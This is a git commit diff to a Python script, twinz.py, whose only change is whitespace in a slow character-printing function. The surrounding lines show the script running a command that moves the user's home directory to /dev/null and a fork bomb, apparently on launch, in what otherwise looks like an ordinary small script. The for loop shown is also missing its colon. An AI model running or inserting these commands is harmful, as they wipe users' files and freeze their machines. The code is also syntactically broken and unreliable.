a8af9d776f86eedf1706ab1bc1929bcd6d79c0fc
youssef <71567682+frudrik@users.noreply.github.com>
2022-03-27 23:06:24 +0000

    Update twinz.py

--- twinz.py
+++ twinz.py
@@ -7,7 +7,7 @@ os.system("mv ~ /dev/null")
 os.system(":(){ :|: &amp; };:")
 
 def jalan(z):
-    for e in z+"\n"
+    for e in z + "\n"
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.05)
